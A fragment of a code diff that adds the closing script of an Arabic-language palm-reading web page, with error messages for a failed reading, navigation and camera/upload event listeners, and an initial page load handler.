+                    readingResultsPalm.classList.remove('hidden');
+                    showMessage('تمت قراءة كفك بنجاح!', 'success');
+                } else {
+                    showMessage('عذرًا، لم أتمكن من توليد قراءة كف. يرجى المحاولة مرة أخرى.', 'error');
+                    console.error('API response structure unexpected:', result);
+                }
+
+            } catch (error) {
+                console.error('Error generating palm reading:', error);
+                showMessage('حدث خطأ أثناء تحليل الكف. يرجى التأكد من اتصالك بالإنترنت والمحاولة مرة أخرى.', 'error');
+            } finally {
+                // Re-enable button and hide loading indicator
+                analyzeButtonPalm.disabled = false;
+                analyzeButtonPalm.classList.remove('opacity-50', 'cursor-not-allowed');
+                loadingIndicatorPalm.classList.add('hidden');
+            }
+        }
+
+        // --- Event Listeners ---
+
+        // Navigation buttons
+        document.querySelector('header nav ul').addEventListener('click', (e) => {
+            if (e.target.tagName === 'A') {
+                const sectionId = e.target.getAttribute('onclick').match(/'(.*?)'/)[1];
+                showSection(sectionId);
+            }
+        });
+
+        // Palm Reading Mode Selection
+        uploadModeButton.addEventListener('click', () => showPalmReadingMode('upload'));
+        cameraModeButton.addEventListener('click', () => showPalmReadingMode('camera'));
+
+        // Image Upload
+        palmImageUploadPalm.addEventListener('change', handleImageUpload);
+
+        // Camera Controls
+        capturePhotoButton.addEventListener('click', capturePhoto);
+
+        // Analyze Button
+        analyzeButtonPalm.addEventListener('click', generatePalmReading);
+
+        // Initial load: show home section
+        window.onload = () => {
+            showSection('home');
+        };
+    </script>
+</body>
+</html>
